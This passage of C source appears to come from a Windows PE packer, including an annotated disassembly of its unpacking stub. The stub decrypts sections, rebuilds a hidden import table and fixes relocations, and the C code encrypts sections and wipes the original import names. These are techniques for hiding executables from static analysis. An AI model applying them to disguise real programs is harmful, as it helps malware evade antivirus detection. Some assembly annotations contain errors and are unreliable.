assume  [ebp+453]: ptr kernel32.VirtualProtectStub
0092  [E8 58 01 00 00]  call 01EF
assume call: SetSectionProtect()

; decrypt sections
0097  [BA 2B 02 00 00]  mov edx, 22B
009C  [03 D5]  add edx. dbp
assume edx: ptr ORGPEINFO
009E  [8D 52 10]  lea edx, dword ptr ds:[edx+10]
assume edx: ptr ENCRYPTDATA.pEncryptData
00A1  [8B 02]  mov eax. dword ptr ds:[edx]
assume eax: data ENCRYPTDATA.pEncryptDataBase

[loop]
00A3  [EB 1B]  jmp 00C0
; get the virtual address
00A5  [8B B5 5B 04 00 00]  mov esi, dword ptr ss:[ebp+45B]
assume esi: data pe_image_BaseAddr
00AB  [03 F0]  add esi, eax
assume esi: ptr pe_image_BaseAddr + ENCRYPTDATA.pEncryptDataBase
00AD  [8B FE]  mov edi, esi
assume edi: ptr pe_image_BaseAddr + ENCRYPTDATA.pEncryptDataBase
; get the size
00AF  [8B 4A 04]  mov ecx, dword ptr ds:[edx+4]
assume ecx: data ENCRYPTDATA.dwEncryptDataSize
00B2  [51]  push ecx
00B3  [57]  push edi
00B4  [56]  push esi
00B5  [FF 95 57 04 00 00]  call dword ptr ss:[ebp+457]
assume call: DecryptData()
00BB  [83 C2 08]  add edx, 8
00BE  [8B 02]  mov eax. dword ptr ds:[edx]
assume  eax: ptr Next ENCRYPTDATA.pEncryptDataBase
00C0  [0B C0]  or eax, eax
00C2  [75 E1]  jne 00A5
[loop end]

; initialize the original import table
00C4  [BE 2B 02 00 00]  mov esi, 22B
00C9  [03 F5]  add esi, ebp
assume esi: ptr ORGPEINFO
00CB  [8B 76 04]  mov esi, dword ptr ds:[esi+4]
assume esi: data ORGPEINFO.dwNewImportTableOffset
00CE  [03 F5]  add esi, ebp
assume esi: ptr pNewImportTableBase
00D0  [8B 3E]  mov edi, dword ptr ds:[esi]
assume edi: ptr pNewImportTableBase

///////////////////////////
//new import table structure (pNewImportTableBase)
//IMAGE_THUNK_DATA(4byte)
//+ DLL name size include '\0'(1byte)
//+ DLL name
//+ number of functions(4byte)
//[loop]
//+ function name size include '\0'(1byte)
//+ function name
//[loop end]
///////////////////////////

[loop]
; pNewImportTableBase -> IMAGE_THUNK_DATA
00D2  [EB 54]  jmp 0128
00D4  [03 BD 5B 04 00 00]  add edi, dword ptr ss:[ebp+45B]
assume edi: ptr pNewImportTableBase + pe_image_BaseAddr
; the DLL name
00DA  [83 C6 05]  add esi, 5
; load the DLL
00DD  [56]  push esi
assume esi: ptr DLL name
00DE  [FF 95 47 04 00 00]  call dword ptr ss:[ebp+447]
assume call: kernel32.GetModuleHandleA()
00E4  [0B C0]  or eax, eax
00E6  [75 07]  jne 00EF
00E8  [56]  push esi
assume esi: ptr DLL name
00E9  [FF 95 4B 04 00 00]  call dword ptr ss:[ebp+44B]
assume call: kernel32.LoadLibraryAStub()
00EF  [8B D0]  mov edx, eax
assume edx: ptr kernel32.GetModuleHandleA() or kernel32.LoadLibraryAStub()
00F1  [0F B6 4E FF]  movzx ecx, byte ptr ds:[esi-1]
assume ecx: data DLL name size include '\0'(1byte)
00F5  [03 F1]  add esi, ecx
assume esi: ptr DLL name + DLL name size include '\0'(1byte)
; the number of functions
00F7  [8B 0E]  mov ecx, dword ptr ds:[esi]
assume ecx: data number of functions(4byte)
00F9  [83 C6 04]  add esi, 4
assume esi: ptr function name size include '\0'(1byte)

  [loop loop]
00FC  [EB 24]  jmp 0122
00FE  [51]  push ecx
assume ecx: data number of functions(4byte)
00FF  [52]  push edx
assume edx: ptr kernel32.GetModuleHandleA() or kernel32.LoadLibraryAStub()
; the size of the function name
0100  [0F B6 1E]  movzx ebx, byte ptr ds:[esi]
assume ebx: data function name size include '\0'(1byte)
0103  [46]  inc esi
assume esi: ptr function name
; imported by the order
0104  [0B DB]  or ebx, ebx
0106  [75 08]  jne 0110
; the function order
0108  [8B 1E]  mov ebx, dword ptr ds:[esi]
010A  [83 C6 04]  add esi, 4
assume esi: ptr Next function size
010D  [53]  push ebx
; imported by the name
010E  [EB 03]  jmp 0113
; the function name
0110  [56]  push esi
assume esi: ptr function name
0111  [03 F3]  add esi, ebx
assume esi: ptr Next function size
0113  [52]  push edx
assume edx: kernel32.GetModuleHandleA() or kernel32.LoadLibraryAStub()
; get the address of the function
0114  [FF 95 43 04 00 00]  call dword ptr ss:[ebp+443]
assume call: kernel32.GetProcAddressStub()
; save the address to the import address table (IAT)
011A  [89 07]  mov dowrd ptr ds:[edi], eax
011C  [83 C7 04]  add edi, 4
assume edi: ptr Next IAT
011F  [5A]  pop edx
0120  [59]  pop ecx
0121  [49]  dec ecx
0122  [0B C9]  or ecx, ecx
0124  [75 D8]  jne 00FE
  [loop loop end]
0126  [8B 3E]  mov edi, dword ptr ds:[esi]
assume edi: ptr Next IMAGE_THUNK_DATA
0128  [0B FF]  or edi, edi
012A  [75 A8]  jne 00D4
[loop end]

; relocation
012C  [BA 2B 02 00 00]  mov edx, 22B
0131  [03 D5]  add edx, ebp
assume edx: ptr ORGPEINFO
; edx is the default base address of the PE image
0133  [8B 52 0C]  mov edx, dword ptr ds:[edx+C]
assume edx: data ORGPEINFO.pOrgImageBase [00 00 40 00]
0136  [8B 9D 5B 04 00 00]  mov ebx, dword ptr ss:[ebp+45B]
assume ebx: data pe_image_BaseAddr
013C  [3B DA]  cmp ebx, edx
013E  [74 59]  je 0199
0140  [BE 2B 02 00 00]  mov esi, 22B
0145  [03 F5]  add esi, ebp
assume esi: ptr ORGPEINFO
0147  [8B 76 08]  mov esi, dword ptr ds:[esi+8]
assume esi: data ORGPEINFO.reloc_table_rva
014A  [0B F6]  or esi, esi
014C  [74 4B]  je 0199
014E  [03 F3]  add esi, ebx
assume esi: ptr IMAGE_BASE_RELOCATION
0150  [8B 3E]  mov edi, dword ptr ds:[esi]
assume edi: data IMAGE_BASE_RELOCATION.VirtualAddress

[loop]
0152  [EB 41]  jmp 0195
0154  [8B 4E 04]  mov ecx, dword ptr ds:[esi+4]
assume ecx: data IMAGE_BASE_RELOCATION.SizeOfBlock
0157  [83 E9 08]  sub ecx, 8
015A  [D1 E9]  shr ecx, 1
assume ecx: data (IMAGE_BASE_RELOCATION.SizeOfBlock - sizeof(VirtualAddress) - sizeof(SizeOfBlock)) / sizeof(TypreOffset)
015C  [83 C6 08]  add esi, 8
assume esi: ptr TypeOffset[1]

  [loop loop]
015F  [EB 2E]  jmp 018F
0161  [33 C0]  xor eax, eax
assume eax: data nothing
0163  [66 8B 06]  mov ax, word ptr ds:[esi]
assume ax: data TypeOffset
0166  [66 25 00 F0]  and ax, F000
016A  [66 C1 E8 0C]  shr ax, C
; check the relocation type
016E  [66 83 F8 03]  cmp ax, 3
0172  [75 17]  jmp 018B
0174  [33 C0]  xor eax, eax
assume eax: data nothing
0176  [66 8B 06]  mov ax, word ptr ds:[esi]
assume ax: data TypeOffset
; get the relocation offset
0179  [66 25 FF 0F]  and ax, FFF
017D  [57]  push edi
assume edi: data IMAGE_BASE_RELOCATION.VirtualAddress
017E  [03 F8]  add edi, eax
0180  [03 FB]  add edi, ebx
; adjust the address
0182  [8B 07]  mov eax, dword ptr ds:[edi]
assume eax: ptr IMAGE_BASE_RELOCATION.VirtualAddress + eax + pe_image_BaseAddr
0184  [2B C2]  sub eax, edx
assume eax: data eax - ORGPEINFO.image_base
0186  [03 C3]  add eax, ebx
assume eax: data eax + pe_image_BaseAddr
0188  [89 07]  mov dword ptr ds:[edi], eax
018A  [5F]  pop edi
018B  [83 C6 02]  add esi, 2
assume esi: Next TypeOffset[1]
018E  [49]  dec ecx
018F  [0B C9]  or ecx, ecx
0191  [75 CE]  jne 0161
  [loop loop end]
0193  [8B 3E]  mov edi, dword ptr ds:[esi]
assume edi: Next IMAGE_BASE_RELOCATION.VirtualAddress
0195  [0B FF]  or edi, edi
0197  [75 BB]  jne 0154
[loop end]

; recover the original protection of sections
0199  [8D B5 5F 04 00 00]  lea esi, dword ptr ss:[ebp+45F]
019F  [8D BD 5F 04 00 00]  lea edi, dword ptr ss:[ebp+45F]
01A5  [57]  push edi
assume edi: ptr section_protections
01A6  [56]  push esi
assume esi: ptr section_protections
01A7  [FF B5 5B 04 00 00]  push dword ptr ss:[ebp+45B]
assume [ebp+45B]: data pe_image_BaseAddr
01AD  [FF B5 53 04 00 00]  push dword ptr ss:[ebp+453]
assume [ebp+453]: data virtual_protect_addr
01B3  [E8 37 00 00 00]  call 01EF
assume call: SetSectionProtect()

; jmp to the original entry
01B8  [B8 2B 02 00 00]  mov eax, 22B
01BD  [03 C5]  add eax, ebp
assume  eax: ptr ORGPEINFO
01BF  [8B 00]  mov eax, dword ptr ds:[eax]
assume  eax: data ORGPEINFO.dwOrgEntryPoint
01C1  [03 85 5B 04 00 00]  add eax, dword ptr ss:[ebp+45B]
assume  eax: data ORGPEINFO.dwOrgEntryPoint + pe_image_BaseAddr
01C7  [89 85 CF 01 00 00]  mov dword ptr ss:[ebp+1CF], eax
01CD  [61]  popal
01CE  [68 FF FF FF FF]  push FFFFFFFF
01D3  [C3]  ret

; ------------------------ GetSectionHeader proc ------------------------
; GetSectionHeader  proc  module: dword
01D4  [55]  push ebp
01D5  [8B EC]  mov ebp, esp
01D7  [8B 45 08]  mov eax. dword ptr ss:[ebp+8]
assume eax: ptr IMAGE_DOS_HEADER
01DA  [03 40 3C]  add eax, dword ptr ds:[eax+3C]
assume eax: ptr IMAGE_NT_HEADERS
; ecx is the number of sections
01DD  [0F B7 48 06]  movzx ecx, word ptr ds:[eax+6]
assume ecx: data IMAGE_NT_HEADERS.FileHeader.NumberOfSections
01E1  [66 03 40 14]  add ax, word ptr ds:[eax+14]
01E5  [83 C0 04]  add eax, 4
01E8  [83 C0 14]  add eax, 14
assume eax: ptr IMAGE_SECTION_HEADER
01EB  [C9]  leave
00EC  [C2 04 00]  ret 4
; GetSectionHeader  endp

; ------------------------ SetSectionProtect proc ------------------------
; SetSectionProtect  proc  virtual_protect_addr: dword, module: dword, new_protect: dword, old_protect: dword
01EF  [55]  push ebp
01F0  [8B EC]  mov ebp, esp
01F2  [60]  pushal
01F3  [FF 75 0C]  push dword ptr ss:[ebp+C]
assume [ebp+8]: data pe_image_BaseAddr
01F6  [E8 D9 FF FF FF]  call <sub_01D4>
assume call: GetSectionHeader()

; ecx is the number of sections
; edx is base address of the IMAGE_SECTION_HEADER array
01FB  [8B D8]  mov ebx, eax
assume ebx: ptr IMAGE_SECTION_HEADER
01FD  [8B 75 10]  mov esi, dword ptr ss:[ebp+10]
assume esi: data section_protections
0200  [8B 7D 14]  mov edi, dword ptr ss:[ebp+14]
assume edi: data section_protections
0203  [33 D2]  xor edx, edx
assume edx: nothing

[loop]
0205  [EB 1B]  jmp 0222
0207  [60]  pushal
0208  [8D 04 97]  lea eax, dword ptr ds:[edi+edx*4]
020B  [50]  push eax
assume eax: ptr section_protections[edi+edx*4]
020C  [8B 04 96]  mov eax, dword ptr ds:[esi+edx*4]
020F  [50]  push  eax
assume eax: data section_protections[esi+edx*4]
0210  [FF 73 08]  push dword ptr ds:[ebx+8]
assume [ebx+8]: data IMAGE_SECTION_HEADER.Misc.VirtualSize
0213  [8B 43 0C]  mov eax, dword ptr ds:[ebx+C]
assume eax: data IMAGE_SECTION_HEADER.VirtualAddress
0216  [03 45 0C]  add eax, dword ptr ss:[ebp+C]
0219  [50]  push eax
assume eax: ptr IMAGE_SECTION_HEADER.VirtualAddress + pe_image_BaseAddr
021A  [FF 55 08]  call dword ptr ss:[ebp+8]
assume call: VirtualProtectStub()

021D  [61]  popal
021E  [83 C3 28]  add ebx, 28
assume ebx: ptr Next IMAGE_SECTION_HEADER
0221  [42]  inc edx
0222  [3B D1]  cmp edx, ecx
0224  [75 E1]  jne 0207
[loop end]

0226  [61]  popal
0227  [C9]  leave
0228  [C2 10 00]  ret 10
; SetSectionProtect  endp


; ------------------------ loadseg LoadData ------------------------
>BYTE bShellSection_loadseg_LoadData[]
pOrgPEInfo label  dword
ORGPEINFO  struct
; The entry point.
022B  [00 00 00 00] //dwOrgEntryPoint  dword  ?
; The offset of the original import table, relative to the load segment.
022F  [00 00 00 00]  //dwNewImportTableOffset  dword  ?
; The relative virtual address of the relocation table.
0233  [00 00 00 00] //dwRelocTableRva  dword  ?
; The image base.
0237  [00 00 00 00] //pOrgImageBase  dword  ?
; The encryption information of sections, up to 0x40 sections and a blank structure.

;pEncryptData  ENCRYPTDATA  MAX_ENCRY_SECTION_COUNT + 1 dup(<?>)
pEncryptData label  dword
ENCRYPTDATA  struct

; The offset, relative to the shell.
023B  [00 00 00 00] //dwNewEncrytOffset  dword  ?
; The size.
023F  [00 00 00 00] //dwNewEncrytSize  dword  ?
0243  [00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]

ENCRYPTDATA  ends
ORGPEINFO  ends

; it's convenient for data copy
0443  [00 00 00 00] //get_proc_address_addr  dd  0  = kernel32.GetProcAddressStub
0447  [00 00 00 00] //get_module_handle_addr  dd  0  = kernel32.GetModuleHandleAStub
044B  [00 00 00 00] //load_library_addr  dd  0  = kernel32.LoadLibraryAStub
044F  [00 00 00 00] //virtual_alloc_addr  dd  0  = kernel32.VirtualAllocStub
0453  [00 00 00 00] //virtual_protect_addr  dd  0  = kernel32.VirtualProtectStub
0457  [00 00 00 00] //decryptdata_proc_addr  dd  0  = DecryptData proc
045B  [00 00 00 00]  //pe_image_BaseAddr   dd  0  = pe_image_BaseAddr

  ; The protection of sections
//section_protections  dd  MAX_ENCRY_SECTION_COUNT dup(?)

045F  [00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]

055F  [4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00]  //kernel32_name  db  'Kernel32.dll', 0
056C  [56 69 72 74 75 61 6C 50 72 6F 74 65 63 74 00]  //virtual_protect_name  db  'VirtualProtect', 0
; --------------------------------------------------------------
*/

void EncryptFileData(PBYTE pData, DWORD pDataSize)
{
  for (int i = 0; i < pDataSize; ++i)
  {
    pData[i] += 0xCC;
  }
}

PFILEVIEW GetFileView(LPCTSTR szFileName)
{
  HANDLE hRead = INVALID_HANDLE_VALUE;
  PFILEVIEW pFileView = {0};
  DWORD nRead = 0;
  PIMAGE_DOS_HEADER pIDH = {0};
  PIMAGE_NT_HEADERS pINH = {0};

  pFileView = malloc(sizeof(FILEVIEW));
  memset(pFileView, 0, sizeof(FILEVIEW));

  // Read the file
  hRead = CreateFileA(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hRead == INVALID_HANDLE_VALUE)
  {
    printf("[!] It's not found the CreateFile hRead !!\n");
    return FALSE;
  }

  // Get a file size & create a file view
  pFileView->dwFileSize = GetFileSize(hRead, NULL);
  pFileView->hFileView = CreateFileMapping(hRead, NULL, PAGE_READONLY, 0, 0, NULL);
  if (pFileView->hFileView == NULL)
  {
    printf("[!] It's not found the CreateFileMapping pFileView->hFileView !!\n");
    return FALSE;
  }

  // Mapping file to image
  pFileView->pBaseAddr = (PBYTE)MapViewOfFile(pFileView->hFileView, FILE_MAP_READ, 0, 0, 0);
  if (pFileView->pBaseAddr == NULL)
  {
    printf("[!] It's not found the MapViewOfFile pFileView->pBaseAddr !!\n");
    return FALSE;
  }

  // Check PE file format
  pIDH = (PIMAGE_DOS_HEADER)pFileView->pBaseAddr;
  if (pIDH->e_magic != IMAGE_DOS_SIGNATURE)
  {
    printf("[!] It's not PE File Format.\n");
    return FALSE;
  }

  pINH = (PIMAGE_NT_HEADERS)(pFileView->pBaseAddr + pIDH->e_lfanew);
  if (pINH->Signature != IMAGE_NT_SIGNATURE || pINH->FileHeader.NumberOfSections <= 1)
  {
    printf("[!] It's not PE File Format.\n");
    return FALSE;
  }

  // Calc the PE header size
  DWORD dwIDHHeaderSize, dwINHHeaderSize, dwISHHeaderSize = 0;

  dwIDHHeaderSize = pIDH->e_lfanew;
  dwINHHeaderSize = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + pINH->FileHeader.SizeOfOptionalHeader;
  dwISHHeaderSize = pINH->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);

  pFileView->dwPEHeaderSize = dwIDHHeaderSize + dwINHHeaderSize + dwISHHeaderSize;

  if (DEBUG)
  {
    printf("[+] e_magic : %X, Signature : %X\n", pIDH->e_magic, pINH->Signature);
    printf("[+] pFileView->dwPEHeaderSize : %X\n", pFileView->dwPEHeaderSize);
    printf("==========================================\n");
  }

  // Clear Handle
  CloseHandle(pFileView->hFileView);
  CloseHandle(hRead);
  return pFileView;
}

PPEFORMAT MappingPEImage(PFILEVIEW pFileView)
{
  PPEFORMAT pPEFormat = {0};

  pPEFormat = malloc(sizeof(PEFORMAT));
  memset(pPEFormat, 0, sizeof(PEFORMAT));

  PIMAGE_DOS_HEADER pIDH = {0};
  PIMAGE_NT_HEADERS pINH = {0};
  PIMAGE_SECTION_HEADER pISH = {0};
  pIDH = (PIMAGE_DOS_HEADER)pFileView->pBaseAddr;
  pINH = (PIMAGE_NT_HEADERS)(pFileView->pBaseAddr + pIDH->e_lfanew);
  pISH = (PIMAGE_SECTION_HEADER)(pFileView->pBaseAddr + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS));

  pPEFormat->dwImageSize = pINH->OptionalHeader.SizeOfImage;
  pPEFormat->pBaseAddr = (PBYTE)VirtualAlloc(NULL, pPEFormat->dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
  if (pPEFormat->pBaseAddr == NULL)
  {
    printf("[!] It's not found the VirtualAlloc pPEFormat->pBaseAddr !!\n");
    return FALSE;
  }
  memset(pPEFormat->pBaseAddr, 0, pPEFormat->dwImageSize);

  if (DEBUG)
  {
    printf("[+] pPEFormat->pBaseAddr : %X\n", pPEFormat->pBaseAddr);
    printf("[+] pPEFormat->dwImageSize : %X\n", pPEFormat->dwImageSize);
  }

  // Memcpy pFileView->pBaseAddr to pPEFormat->pBaseAddr
  memcpy(pPEFormat->pBaseAddr, pFileView->pBaseAddr, pFileView->dwPEHeaderSize);

  pPEFormat->pIDH = (PIMAGE_DOS_HEADER)pPEFormat->pBaseAddr;
  pPEFormat->pINH = (PIMAGE_NT_HEADERS)(pPEFormat->pBaseAddr + pPEFormat->pIDH->e_lfanew);
  pPEFormat->pIFH = &pPEFormat->pINH->FileHeader;
  pPEFormat->pIOH = &pPEFormat->pINH->OptionalHeader;
  pPEFormat->pISH = (PIMAGE_SECTION_HEADER)(pPEFormat->pBaseAddr + pPEFormat->pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS));

  // Check dll pe format
  if (pPEFormat->pIFH->Characteristics & IMAGE_FILE_DLL)
  {
    printf("[!] It's not PE File Format.\n");
    return FALSE;
  }

  // Memcpy pFileView section PointerToRawData to pPEFormat section VirtualAddress
  for (int i = 0; i < pPEFormat->pIFH->NumberOfSections; ++i)
  {
    if (pPEFormat->pISH[i].SizeOfRawData == 0x00)
    {
      continue;
    }

    PBYTE const pSrc = pFileView->pBaseAddr + pPEFormat->pISH[i].PointerToRawData;
    PBYTE const pDest = pPEFormat->pBaseAddr + pPEFormat->pISH[i].VirtualAddress;
    memcpy(pDest, pSrc, pPEFormat->pISH[i].SizeOfRawData);
  }

  // Memcpy pFileView tls table to &pPEFormat->ITD
  if (pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0x00 && pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size > 0)
  {
    PBYTE const pSrc = pPEFormat->pBaseAddr + pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    memcpy(&pPEFormat->ITD, pSrc, sizeof(IMAGE_TLS_DIRECTORY));

    if (DEBUG)
    {
      printf("[+] Exist the tls table\n");
      printf("[+] &pPEFormat->ITD : %X\n", &pPEFormat->ITD);
    }
  }

  // Save Extradata
  PBYTE const pSectionEndBase = pFileView->pBaseAddr + pISH[pPEFormat->pIFH->NumberOfSections - 1].PointerToRawData + pISH[pPEFormat->pIFH->NumberOfSections - 1].SizeOfRawData;
  pPEFormat->dwExtraSize = pFileView->dwFileSize - (pSectionEndBase - pFileView->pBaseAddr);

  if (pPEFormat->dwExtraSize > 0)
  {
    pPEFormat->pExtraBaseAddr = pSectionEndBase;
    if (DEBUG)
    {
      printf("[+] Exist the extra data\n");
      printf("[+] pPEFormat->dwExtraSize : %X\n", pPEFormat->dwExtraSize);
      printf("==========================================\n");
    }
  }

  return pPEFormat;
}

BOOL NewImportTable(PPEFORMAT pPEFormat)
{
  PIMAGE_THUNK_DATA pIAT = {0};
  PIMAGE_IMPORT_BY_NAME pIIBN = {0};
  PIMAGE_IMPORT_DESCRIPTOR pIDT = {0};

  ///////////////////////////
  //new import table structure (pNewImportTableBase)
  //IMAGE_THUNK_DATA(4byte)
  //+ DLL name size include '\0'(1byte)
  //+ DLL name
  //+ number of functions(4byte)
  //[loop]
  //+ function name size include '\0'(1byte)
  //+ function name
  //[loop end]
  ///////////////////////////

  // Calc the New Import table size
  if (pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0x00 && pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0)
  {
    pIDT = (PIMAGE_IMPORT_DESCRIPTOR)(pPEFormat->pBaseAddr + pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    DWORD size = 0;

    for (; pIDT->Name; ++pIDT)
    {
      size += sizeof(IMAGE_THUNK_DATA);
      size += sizeof(BYTE);
      size += (strlen(pPEFormat->pBaseAddr + pIDT->Name) + 1) * sizeof(CHAR);
      size += sizeof(DWORD);

      if (pIDT->OriginalFirstThunk != 0)
      {
        pIAT = (PIMAGE_THUNK_DATA)(pPEFormat->pBaseAddr + pIDT->OriginalFirstThunk);
      }
      else
      {
        pIAT = (PIMAGE_THUNK_DATA)(pPEFormat->pBaseAddr + pIDT->FirstThunk);
      }

      for (; pIAT->u1.AddressOfData != 0; ++pIAT)
      {
        size += sizeof(BYTE);

        // DWORD Ordinal = 0x08000000 check
        if (IMAGE_SNAP_BY_ORDINAL(pIAT->u1.Ordinal))
        {
          size += sizeof(VOID *);
        }
        else
        {
          pIIBN = (PIMAGE_IMPORT_BY_NAME)(pPEFormat->pBaseAddr + pIAT->u1.AddressOfData);
          size += (strlen((CHAR *)pIIBN->Name) + 1) * sizeof(CHAR);
        }
      }
    }
    pPEFormat->dwNewImportTableSize = size;
  }
  else
  {
    printf("[!] It's not found the new import table size !!\n");
    return FALSE;
  }

  pPEFormat->pNewImportTableBase = (PBYTE)VirtualAlloc(NULL, pPEFormat->dwNewImportTableSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
  if (pPEFormat->pNewImportTableBase == NULL)
  {
    printf("[!] It's not found the VirtualAlloc pPEFormat->pNewImportTableBase !!\n");
    return FALSE;
  }
  memset(pPEFormat->pNewImportTableBase, 0, pPEFormat->dwNewImportTableSize);

  // Write the New Import table
  pIDT = (PIMAGE_IMPORT_DESCRIPTOR)(pPEFormat->pBaseAddr + pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

  // Get the current address of the new table
  PBYTE buffer = pPEFormat->pNewImportTableBase;

  for (; pIDT->Name; ++pIDT)
  {
    // Memcpy the FirstThunk structure
    memcpy(buffer, &pIDT->FirstThunk, sizeof(IMAGE_THUNK_DATA));
    buffer += sizeof(IMAGE_THUNK_DATA);

    // Save the size of the DLL name, including the '\0'
    *buffer = (strlen(pPEFormat->pBaseAddr + pIDT->Name) + 1) * sizeof(CHAR);
    buffer += sizeof(BYTE);

    // Memcpy the DLL name
    memcpy(buffer, pPEFormat->pBaseAddr + pIDT->Name, (strlen(pPEFormat->pBaseAddr + pIDT->Name) + 1) * sizeof(CHAR));
    buffer += (strlen(pPEFormat->pBaseAddr + pIDT->Name) + 1) * sizeof(CHAR);

    // Get the location where the number of functions being saved
    DWORD *const func_num = (DWORD *)buffer;
    *func_num = 0;
    buffer += sizeof(DWORD);

    // Get the import name table (INT) or the import address table (IAT)
    if (pIDT->OriginalFirstThunk != 0)
    {
      pIAT = (PIMAGE_THUNK_DATA)(pPEFormat->pBaseAddr + pIDT->OriginalFirstThunk);
    }
    else
    {
      pIAT = (PIMAGE_THUNK_DATA)(pPEFormat->pBaseAddr + pIDT->FirstThunk);
    }

    for (; pIAT->u1.AddressOfData != 0; ++pIAT)
    {
      if (IMAGE_SNAP_BY_ORDINAL(pIAT->u1.Ordinal))
      {
        // Save the flag 0x00
        *buffer = 0;
        buffer += sizeof(BYTE);

        // Save the function order
        *(VOID **)buffer = (VOID *)IMAGE_ORDINAL(pIAT->u1.Ordinal);
        //0x80000000(1000 0000 0000 0000 0000 0000 0000 0000) & 0xFFFF(1111 1111 1111 1111)
        buffer += sizeof(VOID *);
      }
      else
      {
        pIIBN = (PIMAGE_IMPORT_BY_NAME)(pPEFormat->pBaseAddr + pIAT->u1.AddressOfData);

        // Save the size of the function name, including the '\0'
        *buffer = (strlen((CHAR *)pIIBN->Name) + 1) * sizeof(CHAR);
        buffer += sizeof(BYTE);

        // Memcpy the function name
        memcpy(buffer, pIIBN->Name, (strlen((CHAR *)pIIBN->Name) + 1) * sizeof(CHAR));
        buffer += (strlen((CHAR *)pIIBN->Name) + 1) * sizeof(CHAR);
      }
      // Update the number of functions
      ++*func_num;
    }
  }

  // Clear the IMPORT_DESCRIPTOR
  pIDT = (PIMAGE_IMPORT_DESCRIPTOR)(pPEFormat->pBaseAddr + pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

  for (; pIDT->Name; ++pIDT)
  {
    // Clear the DLL name
    memset(pPEFormat->pBaseAddr + pIDT->Name, 0, (strlen(pPEFormat->pBaseAddr + pIDT->Name) + 1) * sizeof(CHAR));

    // Clear the import name table (INT)
    if (pIDT->OriginalFirstThunk != 0)
    {
      pIAT = (PIMAGE_THUNK_DATA)(pPEFormat->pBaseAddr + pIDT->OriginalFirstThunk);

      for (; pIAT->u1.AddressOfData != 0; ++pIAT)
      {
        if (!IMAGE_SNAP_BY_ORDINAL(pIAT->u1.Ordinal))
        {
          // Clear the function name
          pIIBN = (PIMAGE_IMPORT_BY_NAME)(pPEFormat->pBaseAddr + pIAT->u1.AddressOfData);
          memset(pIIBN, 0, sizeof(WORD) + strlen((CHAR *)pIIBN->Name) * sizeof(CHAR));
        }
        memset(pIAT, 0, sizeof(IMAGE_THUNK_DATA));
      }
    }

    pIAT = (PIMAGE_THUNK_DATA)(pPEFormat->pBaseAddr + pIDT->FirstThunk);
